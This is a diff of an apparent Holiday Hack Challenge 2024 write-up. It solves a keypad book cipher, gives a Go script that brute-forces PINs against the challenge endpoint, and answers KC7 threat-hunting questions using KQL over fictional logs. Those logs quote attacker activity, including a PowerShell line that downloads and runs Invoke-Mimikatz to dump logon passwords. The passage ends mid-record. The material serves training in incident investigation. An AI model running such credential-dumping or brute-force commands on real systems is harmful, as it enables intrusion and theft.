@@ -931,6 +931,8 @@ challenge.
 
 ## Frosty Keypad
 
+{{< image src="frosty-keypad/frosty-keypad-location.png" alt="Image of the Frosty Keypad in the North Pole." position="center" style="border-radius: 8px;" >}}
+
 > Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar 
 > rush! We've got a bit of a dilemma, and I could really use your expertise.
 >
@@ -960,6 +962,7 @@ When you look through dev tools you can see the URL. I've provided the Frosty
 Keypad game below so it's easier to sift through.
 
 - [Frosty Keypad](https://hhc24-frostykeypad.holidayhackchallenge.com/?&challenge=termFrostyKeypad)
+
 
 **Hints:**
 
@@ -992,19 +995,47 @@ Keypad game below so it's easier to sift through.
 > Hmmmm. I know I have seen Santa and the other elves use this keypad. I wonder 
 > what it contains. I bet whatever is in there is a National Treasure!
 
-Found the frosty book. URL is below.
+You find the `Frosty Book` somewhere around the crates and then later the
+flash light on the other side. Once the flashlight is found it's part of your
+inventory/items and can be used while the `Frosty Keypad` is pulled up.
 
 - [The Frosty Book](https://frost-y-book.com/)
 
+List of inventory items; that will help with the silver and gold  challenges,
+are shown in the image below. The `Frosty Book` and the `UV Flashlight` are both
+found amounst the crates. If you sit behind them the become transparent and you
+can pick them up.
+
+{{< image src="frosty-keypad/frosty-keypad-items.png" alt="The Frosty Book and UV Flashlight in the items menu." position="center" style="border-radius: 8px;" >}}
+
+I think I've provided enough context and gathered enough information. I should
+be able to work through this now.
+
 ### Solution (Silver)
 
+When you click to connect to the `Frosty Keypad` you're met by a keypad with a
+note. Objective behind this is we need to figure out how to enter the correct
+codes to open the keypad.
+
+{{< image src="frosty-keypad/frosty-keypad.png" alt="Image of the Frosty Keypad in the North Pole." position="center" style="border-radius: 8px;" >}}
+
+If you make the note on the keypad a little larger. It shows the following
+numbers. This kind of looks like the scheme for a book cipher.
+
+{{< image src="frosty-keypad/note.png" alt="Enlarged image of the note stuck to the Frosty Keypad." position="center" style="border-radius: 8px;" >}}
+
 There is a book that can be found amoungst the boxes. The note in the top-left
-corner plays a crucial role for this alongside `The Frosty Book`.
+corner plays a crucial role for this alongside `The Frosty Book`. So, things are
+starting to come together. I will be using `The Frosty Book` to decode the
+cipher.
 
-In the note we get the following text. (I'm presenting it in a list for ease of
-use. I've created a table with the letter 
+{{< image src="frosty-keypad/frosty-book.png" alt="Image of page 1 and 2 of the Frosty Book." position="center" style="border-radius: 8px;" >}}
 
-This is using the schema of `page:word:letter`.
+This is an Ottendorf (Book) cipher. There are different encodings or variants of
+this cipher that can be used. But, in this case the note encoded as 
+`page:word:letter`.
+
+Here is a list of the values in the note they encoded for this challenge.
 
 - 2:6:1
 - 4:10:3
@@ -1012,6 +1043,7 @@ This is using the schema of `page:word:letter`.
 - 3:10:4
 - 14:8:3
 
+When you put the pieces together. You get the following letters as the answer.
 
 | Page | Word | Letter | Answer |
 |-------|----|--------|------|
@@ -1021,9 +1053,12 @@ This is using the schema of `page:word:letter`.
 | 3 | 10 | 4 | T |
 | 14 | 8 | 3 | A |
 
-`SANTA` which is `72682`
+Basically the answer to this challenge is `SANTA` which is `72682` on the
+numerical keypad. This will need to be entered manually into the keypad.
 
-With that entered. It shows a message on the screen that says 
+With that entered. It shows a message on the screen that says the code was
+entered successfully and that we beat the code. Silver medal is provided and we
+can move on to the next stage of the challenge.
 
 ### Solution (Gold)
 
@@ -1042,88 +1077,154 @@ in that order. But, it failed.
             keysToCheck.forEach(key => {
 ```
 
+Looked at all more information in the requests and the source code. Looked at
+the requests and it looks like when it sends a submission to the keypad it uses
+`/submit` with the `?id=$id` parameter. ID parameter was redacted so no one
+could send these requests as my SHHC account.
 
 ```sh
 https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=$id
 ```
 
+When you look at one of these post requests it sends the answer to the URL using
+a JSON payload.
+
 ```json
-{"answer":""}
+{"answer":"2768"}
 ```
+
+When you get an error; because I intend to filter out failures, it shows the
+following repsonse.
 
 ```json
 {"error":"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!"}
 ```
 
+When you get a success output. It shows the following response from the server.
+
 ```json
 {"output":"success"}
 ```
+
+Here is the code I wrote for this. I've been learning `Go` lately and I wanted
+to see the overhead associated with this.
+
+One thing that I would probably change about this is rate limiting it a little.
+It generates like `1024` PINs and sends them as an answer using a `for` loop.
 
 ```go
 package main
 
 import (
-	"encoding/json"
-	"fmt"
-	"log"
-	"io"
-	"bytes"
-	"net/http"
+    "encoding/json"
+    "fmt"
+    "strconv"
+    "log"
+    "io"
+    "bytes"
+    "net/http"
 )
-
 type Answer struct {
-	Answer string `json:"answer"`
+    Answer string `json:"answer"`
 }
 
-type Output struct {
-	Output string `json:"output"`
+func sendPinAttempt(url, userId, pin string) (result string, success bool) {
+    var blindJsonMap map[string]interface{}
+
+    reqUrl := fmt.Sprintf("%s%s", url, userId)
+
+    answer := Answer{Answer: pin}
+
+    answerJson, err := json.Marshal(answer)
+    if err != nil {
+        log.Fatalf("Error: %+v\n", err)
+    }
+
+    req, err := http.NewRequest("POST", reqUrl, bytes.NewBuffer(answerJson))
+    if err != nil {
+        log.Fatalf("Error: %+v\n", err)
+    }
+
+    req.Header.Set("Content-Type", "application/json; charset=UTF-8")
+    req.Header.Set("User-Agent", "n3s0_frostykeypad-crack")
+
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil {
+        log.Fatalf("Error: %+v\n", err)
+    }
+    defer resp.Body.Close()
+
+    body, err := io.ReadAll(resp.Body)
+    if err != nil {
+        log.Fatalf("Error: %+v\n", err)
+    }
+
+    err = json.Unmarshal([]byte(body), &blindJsonMap)
+    if err != nil {
+        log.Fatalf("Error: %+v\n", err)
+    }
+
+    _, ok := blindJsonMap["output"]
+    if ok {
+        result = fmt.Sprintf("%s", blindJsonMap["output"])
+        success = true
+    }
+
+    if !ok {
+        result = ""
+        success = false
+    }
+
+    return
 }
 
-type AuthError struct {
-	Error string `json:"error"`
-}
+func GeneratePinCombinations(length int, knownNumbers []int, currentPin string, allPins *[]string) {
+    if length == 0 {
+        *allPins = append(*allPins, currentPin)
+        return
+    }
 
-func sendPinAttempt(pin, userId string) (string) {
-
-	answer := Answer{Answer: pin}
-	
-	answerJson, err := json.Marshal(answer)
-	if err != nil {
-		log.Fatalf("Error: %+v\n", err)
-	}
-
-	url := fmt.Sprintf("https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=%s", userId)
-
-	req, err := http.NewRequest("POST", url, bytes.NewBuffer(answerJson))
-	if err != nil {
-		log.Fatalf("Error: %+v\n", err)
-	}
-	
-	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
-
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatalf("Error: %+v\n", err)
-	}
-	defer resp.Body.Close()
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatalf("Error: %+v\n", err)
-	}
-
-	return fmt.Sprintf("%s", string(body))
+    for _, digit := range knownNumbers {
+        GeneratePinCombinations(length-1, knownNumbers, currentPin+strconv.Itoa(digit), allPins)
+    }
 }
 
 func main() {
-	id := ""
+    url := "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id="
+    id := ""
 
+    knownNumbers := []int{2, 7, 6, 8}
+    pinLength := 5
 
+    var allPossiblePins []string
+    GeneratePinCombinations(pinLength, knownNumbers, "", &allPossiblePins)
 
-	results := sendPinAttempt("72682", id)
+    fmt.Printf("[i] Total Number of PINs: %d\n", len(allPossiblePins))
+
+    for _, pin := range allPossiblePins {
+        result, ok := sendPinAttempt(url, id, pin)
+        if ok {
+            fmt.Printf("[i]: { pin: %s, result: %s }\n", pin, result)
+        }
+    }
 }
 ```
+
+I ran the code using `go run main.go` in the directory and it works. After
+waiting for a little bit. The output for the PIN showed up as a success.
+
+```sh
+[i] Total Number of PINs: 1024
+[i] { pin: 22786, result: success }
+```
+
+After the new PIN showed up with the result. I stopped it from spraying.
+Confirmed at the `Frosty Keypad` and it said the mission was a success. Gold
+achievement was granted.
+
+Out of that I got myself a random number generator and PIN cracker. I will be
+uploading that to Github at some point.
 
 ## Hardware Hacking 101: Part 1
 
@@ -4140,7 +4241,7 @@ these challenges.
 
 Remember that all queries need to be run on the `NorthPoleWorkshop` database.
 
-## KQL 101
+## Section 1: KQL 101
 
 This is `Section 1: KQL 101` and what looks like when all of the questions have
 been answered for this. There are 10 questions for this challenge. So, let's get
@@ -4421,7 +4522,7 @@ to the next question.
 
 ### Question 7
 
-In this they're having us go through the `distrinct` operator.
+In this they're having us go through the `distinct` operator.
 
 > You can use the distinct operator to filter for unique values in a specific 
 > column.
@@ -4553,6 +4654,16 @@ OutboundNetworkEvents
 
 **Question:** How many distinct URLs did elves with the first name Twinkle visit?
 
+```sql
+let twinkle_ips = Employees
+| where name has "Twinkle"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (twinkle_ips)
+| distinct url
+| count
+```
+
 | Count |
 |------:|
 | 8 |
@@ -4561,67 +4672,823 @@ OutboundNetworkEvents
 8
 ```
 
-## Operation Surrender
+## Section 2: Operation Surrender: Alabaster's Espionage
 
 {{< image src="microsoft-kc7/section2.png" alt="operation surrender section" position="center"  style="border-radius: 8px;" >}}
 
 ### Question 1
 
+Eve Snowshoes approaches with a focused expression. "Welcome to Operation Surrender: Alabaster's Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You'll need to piece together the clues and analyze the data to understand how they gained an advantage."
+
+**Question:** Type surrender to get started!
+
+```txt
+surrender
+```
+
 ### Question 2
+
+Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.
+
+Now, it's up to you to trace the origins of this operation.
+
+**Question:** Who was the sender of the phishing email that set this plan into motion?
+
+Try checking out the email table using the knowledge you gained in the previous section!
+
+```sql
+Email
+| where sender contains "surrender"
+```
+
+```json
+"timestamp": 2024-11-27T14:09:45.000Z,
+"sender": surrender@northpolemail.com,
+"reply_to": surrender@northpolemail.com,
+"recipient": wombley_cube@santaworkshopgeeseislands.org,
+"subject": [EXTERNAL] RE:RE: Official Surrender Notice From Camp AlaBaster,
+"verdict": CLEAN,
+"link": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc
+
+```
+
+
+```txt
+surrender@northpolemail.com
+```
 
 ### Question 3
 
+Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.
+
+Hint: the distinct operator would help here Your mission is to determine the full scale of this operation.
+
+How many elves from Team Wombley received the phishing email?
+
+```sql
+Employees
+| where role contains "Team Wombley"
+```
+
+```sql
+Email
+| where sender == "surrender@northpolemail.com"
+| distinct recipient
+```
+
+```txt
+22
+```
+
 ### Question 4
+
+The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.
+
+To understand the full extent of this operation, we need to identify the file where the link led to in the email.
+
+What was the filename of the document that Team Alabaster distributed in their phishing email?
+
+```sql
+Email
+| where sender == "surrender@northpolemail.com"
+```
+
+```json
+"timestamp": 2024-11-27T14:09:45.000Z,
+"sender": surrender@northpolemail.com,
+"reply_to": surrender@northpolemail.com,
+"recipient": wombley_cube@santaworkshopgeeseislands.org,
+"subject": [EXTERNAL] RE:RE: Official Surrender Notice From Camp AlaBaster,
+"verdict": CLEAN,
+"link": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc
+```
+
+```txt
+Team_Wombley_Surrender.doc
+```
 
 ### Question 5
 
+As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you'll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.
+
+Here’s an example query to help you:
+
+```sql
+Employees
+| join kind=inner (
+    OutboundNetworkEvents
+) on $left.ip_addr == $right.src_ip // condition to match rows
+| where url contains "< maybe a filename :) >"
+| project name, ip_addr, url, timestamp // project returns only the information you select
+| sort by timestamp asc //sorts time ascending
+```
+
+This query will give you a list of employees who clicked on the phishing URL. The first person to click will be at the top of the list!
+
+Who was the first person from Team Wombley to click the URL in the phishing email?
+
+```sql
+Employees
+| join kind=inner (
+    OutboundNetworkEvents
+) on $left.ip_addr == $right.src_ip
+| where url has "Team_Wombley_Surrender.doc"
+| project name, ip_addr, url, timestamp
+| sort by timestamp asc
+```
+
+```json
+"name": Joyelle Tinseltoe,
+"ip_addr": 10.10.0.25,
+"url": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc,
+"timestamp": 2024-11-27T14:11:45.000Z
+```
+
+```txt
+Joyelle Tinseltoe
+```
+
 ### Question 6
+
+Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.
+
+Your mission is to determine the name of the file that was created after the .doc was executed.
+
+Focus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for. Here’s an example to help guide you:
+
+```sql
+ProcessEvents
+| where timestamp between(datetime("2024-11-25T09:00:37Z") .. datetime("2024-11-26T17:20:37Z")) //you’ll need to modify this
+| where hostname == "<Joyelle's hostname>"
+```
+
+This query will show processes that ran on Joyelle Tinseltoe’s machine within the given timeframe.
+
+What was the filename that was created after the .doc was downloaded and executed?
+
+```sql
+Employees
+| where name has "Joyelle"
+```
+
+```json
+"hire_date": 2023-02-02T00:00:00.000Z,
+"name": Joyelle Tinseltoe,
+"user_agent": Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36,
+"ip_addr": 10.10.0.25,
+"email_addr": joyelle_tinseltoe@santaworkshopgeeseislands.org,
+"username": jotinseltoe,
+"role": Craftsperson Elf (Team Wombley),
+"hostname": Elf-Lap-W-Tinseltoe,
+"mfa_enabled": True,
+"company_domain": santaworkshopgeeseislands.org
+```
+
+```sql
+ProcessEvents
+| where timestamp between(datetime("2024-11-27T14:11:45.000Z") .. datetime("2024-11-27T16:11:45.000Z"))
+| where hostname == "Elf-Lap-W-Tinseltoe"
+```
+
+```json
+"timestamp": 2024-11-27T14:12:44.000Z,
+"parent_process_name": Explorer.exe,
+"parent_process_hash": 9d8a7d433af5d645e06f6da852d0d593a750416675aff21d3d42f3243e9de1b5,
+"process_commandline": Explorer.exe "C:\Users\jotinseltoe\Downloads\Team_Wombley_Surrender.doc",
+"process_name": Explorer.exe,
+"process_hash": 8984d7b9a5b33f56d4a3b1e2e140c9a8d19f037a252b7ffc8038e76557a963b5,
+"hostname": Elf-Lap-W-Tinseltoe,
+"username": jotinseltoe
+```
+
+```json
+"timestamp": 2024-11-27T14:12:45.000Z,
+"parent_process_name": Explorer.exe,
+"parent_process_hash": a39ac00c7890ac93af341dafe839265b040d443691ea39268afb198a6f9b0269,
+"process_commandline": C:\Users\Public\AppData\Roaming\keylogger.exe,
+"process_name": keylogger.exe,
+"process_hash": e7e7c6d6a4b5d67a90556b50e45734c8221dbf89f47913d82bd04b47162e141a,
+"hostname": Elf-Lap-W-Tinseltoe,
+"username": jotinseltoe
+```
+
+```txt
+keylogger.exe
+```
 
 ### Question 7
 
-## Operation Snowfall
+Team Alabaster's phishing email, sent from surrender@northpolemail.com, targeted 22 elves from Team Wombley. The email contained a malicious document named Team_Wombley_Surrender.doc, which led to the first click by Joyelle Tinseltoe.
+
+After the document was downloaded and executed, a malicious file was created, impacting the entire Team Wombley as it ran on all their machines, giving Team Alabaster access to their keystokes!
+
+To obtain your flag use the KQL below with your last answer!
+
+```sql
+let flag = "Change This!";
+let base64_encoded = base64_encode_tostring(flag);
+print base64_encoded
+```
+
+**Question:** Enter your flag to continue
+
+```sql
+let flag = "keylogger.exe";
+let base64_encoded = base64_encode_tostring(flag);
+print base64_encoded
+```
+
+```txt
+a2V5bG9nZ2VyLmV4ZQ==
+```
+
+## Section 3: Operation Snowfall: Team Wombley's Ransomware Raid
 
 {{< image src="microsoft-kc7/section3.png" alt="operation snowfall section" position="center"  style="border-radius: 8px;" >}}
 
 ### Question 1
 
+"Fantastic work on completing Section 2!" Eve Snowshoes, Senior Security Analyst, says with a proud smile.
+
+"You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.
+
+But now, we embark on Operation Snowfall: Team Wombley’s Ransomware Raid. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!"
+
+Type snowfall to begin
+
+```txt
+snowfall
+```
+
 ### Question 2
+
+Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack.
+
+Authentication events can be found in the AuthenticationEvents table. Look for a pattern of failed login attempts.
+
+Here’s a query to guide you:
+
+```sql
+AuthenticationEvents
+| where result == "Failed Login"
+| summarize FailedAttempts = count() by username, src_ip, result
+| where FailedAttempts >= 5
+| sort by FailedAttempts desc
+```
+
+What was the IP address associated with the password spray?
+
+```sql
+AuthenticationEvents
+| where result == "Failed Login"
+| summarize FailedAttempts = count() by username, src_ip, result
+| where FailedAttempts >= 5
+| sort by FailedAttempts desc
+```
+
+```json
+"username": spnutmeggins,
+"src_ip": 59.171.58.12,
+"result": Failed Login,
+"FailedAttempts": 248
+```
+
+```json
+"username": twsnowfall,
+"src_ip": 59.171.58.12,
+"result": Failed Login,
+"FailedAttempts": 248
+```
+
+```txt
+59.171.58.12
+```
 
 ### Question 3
 
+After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.
+
+Eve Snowshoes weighs in: "This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated."
+
+How many unique accounts were impacted where there was a successful login from 59.171.58.12?
+
+```sql
+AuthenticationEvents
+| where result has "Successful" and src_ip == "59.171.58.12"
+| distinct username
+| count
+```
+
+```txt
+23
+```
+
 ### Question 4
+
+In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.
+
+Eve Snowshoes remarks, "Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems."
+
+What service was used to access these accounts/devices?
+
+```sql
+AuthenticationEvents
+| where src_ip == "59.171.58.12"
+| distinct description
+```
+
+```json
+"description": User successfully logged onto Elf-Lap-A-Snowflakebreeze via RDP.
+```
+
+```txt
+RDP
+```
+
 
 ### Question 5
 
+Once Team Wombley gained access to Alabaster's system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, "When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response."
+
+The ProcessEvents table will help you track activities that occurred on Alabaster’s laptop. By narrowing down the events by timestamp and hostname, you’ll be able to pinpoint the file that was exfiltrated.
+
+What file was exfiltrated from Alabaster’s laptop?
+
+```sql
+Employees
+| where name has "Alabaster"
+```
+
+```json
+"hire_date": 2022-04-10T00:00:00.000Z,
+"name": Alabaster Snowball,
+"user_agent": Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0,
+"ip_addr": 10.10.0.4,
+"email_addr": alabaster_snowball@santaworkshopgeeseislands.org,
+"username": alsnowball,
+"role": Head Elf,
+"hostname": Elf-Lap-A-Snowball,
+"mfa_enabled": False,
+"company_domain": santaworkshopgeeseislands.org
+```
+
+```sql
+AuthenticationEvents
+| where username == "alsnowball"
+| where result contains "success"
+| where src_ip == "59.171.58.12"
+```
+
+```json
+"timestamp": 2024-12-11T01:39:50.000Z,
+"hostname": Elf-Lap-A-Snowball,
+"src_ip": 59.171.58.12,
+"user_agent": Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/47.0.1792.134 Safari/533,
+"username": alsnowball,
+"result": Successful Login,
+"password_hash": 9ef99f00573e0e03758c2e56e32f30ab,
+"description": User successfully logged onto Elf-Lap-A-Snowball via RDP.
+```
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Snowball"
+```
+
+```json
+"timestamp": 2024-12-16T15:09:13.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'RW5jcnlwdEV2ZXJ5dGhpbmcuZXhlIC1mIC1hRg==';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))",
+"process_name": EncryptEverything.exe,
+"process_hash": 8e1e6bb7f99d01a968ac064dc4b6b288a7a9b2b6b6216a21a4608f34cce3edbd,
+"hostname": Elf-Lap-A-Snowball,
+"username": alsnowball
+
+```
+
+```json
+"timestamp": 2024-12-16T15:44:52.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": move C:\Users\alsnowball\Documents\Secret_Files.zip C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip,
+"process_name": cmd.exe,
+"process_hash": ac9a496574e56f9ce4228d2a492dca67fc1da9fba9673bd07253f6459827f0dc,
+"hostname": Elf-Lap-A-Snowball,
+"username": alsnowball
+```
+
+
+```txt
+Secret_Files.zip
+```
+
 ### Question 6
+
+After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.
+
+Eve Snowshoes comments, "The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system."
+
+What is the name of the malicious file that was run on Alabaster's laptop?
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Snowball"
+```
+
+```json
+"timestamp": 2024-12-16T15:09:13.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'RW5jcnlwdEV2ZXJ5dGhpbmcuZXhlIC1mIC1hRg==';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))",
+"process_name": EncryptEverything.exe,
+"process_hash": 8e1e6bb7f99d01a968ac064dc4b6b288a7a9b2b6b6216a21a4608f34cce3edbd,
+"hostname": Elf-Lap-A-Snowball,
+"username": alsnowball
+
+```
+
+```txt
+EncryptEverything.exe
+```
 
 ### Question 7
 
-## Echos in the Frost
+Outstanding work! You've successfully pieced together the full scope of Team Wombley’s attack. Your investigative skills are truly impressive, and you've uncovered every critical detail.
+
+Just to recap: Team Wombley launched a cyber assault on Alabaster, beginning with a password spray attack that allowed them to gain access to several accounts. Using an external service over RDP, they infiltrated Alabaster’s system, exfiltrating sensitive files including the blueprints for snowball cannons and drones. To further their attack, Wombley executed a malicious file, which encrypted Alabaster’s entire system leaving them locked out and in chaos.
+
+To obtain your flag use the KQL below with your last answer!
+
+```sql
+let flag = "Change This!";
+let base64_encoded = base64_encode_tostring(flag);
+print base64_encoded
+```
+
+Enter your flag to continue
+
+```sql
+let flag = "EncryptEverything.exe";
+let base64_encoded = base64_encode_tostring(flag);
+print base64_encoded
+```
+
+```txt
+RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl
+```
+
+## Section 4: Echos in the Frost: Tracking the Unknown Threat
 
 {{< image src="microsoft-kc7/section4.png" alt="echos in the frost section" position="center"  style="border-radius: 8px;" >}}
 
 ### Question 1
 
+As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. "You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well."
+
+She pauses, the weight of the challenge ahead clear. "This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost."
+
+Type stay frosty to begin
+
+```txt
+stay frosty
+```
+
 ### Question 2
+
+Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.
+
+Eve Snowshoes remarks, "The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves."
+
+What was the timestamp of first phishing email about the breached credentials received by Noel Boetie?
+
+```sql
+Employees
+| where name == "Noel Boetie"
+```
+
+```json
+"hire_date": 2022-05-14T00:00:00.000Z,
+"name": Noel Boetie,
+"user_agent": Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36,
+"ip_addr": 10.10.0.9,
+"email_addr": noel_boetie@santaworkshopgeeseislands.org,
+"username": noboetie,
+"role": IT Helpdesk,
+"hostname": Elf-Lap-A-Boetie,
+"mfa_enabled": True,
+"company_domain": santaworkshopgeeseislands.org
+```
+
+```sql
+Email
+| where recipient == "noel_boetie@santaworkshopgeeseislands.org"
+| where subject contains "credentials"
+```
+
+```json
+"timestamp": 2024-12-12T14:48:55.000Z,
+"sender": mistletoe_jinglebellsworth@santaworkshopgeeseislands.org,
+"reply_to": mistletoe_jinglebellsworth@santaworkshopgeeseislands.org,
+"recipient": noel_boetie@santaworkshopgeeseislands.org,
+"subject": Your credentials were found in recent breach data,
+"verdict": CLEAN,
+"link": https://holidaybargainhunt.io/published/files/files/echo.exe
+```
+
+```txt
+2024-12-12T14:48:55Z
+```
 
 ### Question 3
 
+Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.
+
+When did Noel Boetie click the link to the first file?
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Boetie"
+| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
+```
+
+```json
+"timestamp": 2024-12-12T15:14:38.000Z,
+"parent_process_name": Explorer.exe,
+"parent_process_hash": 00e563ac10db418d26a5e2bf2abbf80bfc4f7e9f4865a72dfe9ec59d26620f25,
+"process_commandline": Explorer.exe "C:\Users\noboetie\Downloads\echo.exe",
+"process_name": Explorer.exe,
+"process_hash": dfa249867546156557f09b322999cad4f628246adca45f36f5bbe106bf6c3b73,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```txt
+2024-12-12T15:13:55Z
+```
+
 ### Question 4
+
+The phishing email directed Noel Boetie to download a file from an external domain.
+
+Eve Snowshoes, "The domain and IP they used to host the malicious file is a key piece of evidence. It might lead us to other parts of their operation, so let’s find it."
+
+What was the IP for the domain where the file was hosted?
+
+```sql
+PassiveDns
+| where domain == "holidaybargainhunt.io"
+```
+
+```json
+"timestamp": 2024-12-07T13:30:08.000Z,
+"ip": 182.56.23.122,
+"domain": holidaybargainhunt.io
+```
+
+```txt
+182.56.23.122
+```
 
 ### Question 5
 
+Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.
+
+It’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.
+
+Eve Snowshoes suggests, "We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials."
+
+Let’s take a closer look at the authentication events. I wonder if any connection events from 182.56.23.122. If so what hostname was accessed?
+
+```sql
+AuthenticationEvents
+| where src_ip == "182.56.23.122"
+```
+
+```json
+"timestamp": 2024-11-29T12:25:03.000Z,
+"hostname": WebApp-ElvesWorkshop,
+"src_ip": 182.56.23.122,
+"user_agent": Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36,
+"username": mijinglebellsworth,
+"result": Successful Login,
+"password_hash": 6a4b8f13abf0baf71d5685bdec9ee6f1,
+"description": User successfully logged onto WebApp-ElvesWorkshop via RDP.
+```
+
+```txt
+WebApp-ElvesWorkshop
+```
+
 ### Question 6
+
+It appears someone accessed the WebApp-ElvesWorkshop from the IP address 182.56.23.122. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.
+
+Eve Snowshoes, "Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system."
+
+What was the script that was run to obtain credentials?
+
+```sql
+ProcessEvents
+| where hostname == "WebApp-ElvesWorkshop"
+```
+
+```json
+"timestamp": 2024-12-10T00:00:00.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords",
+"process_name": cmd.exe,
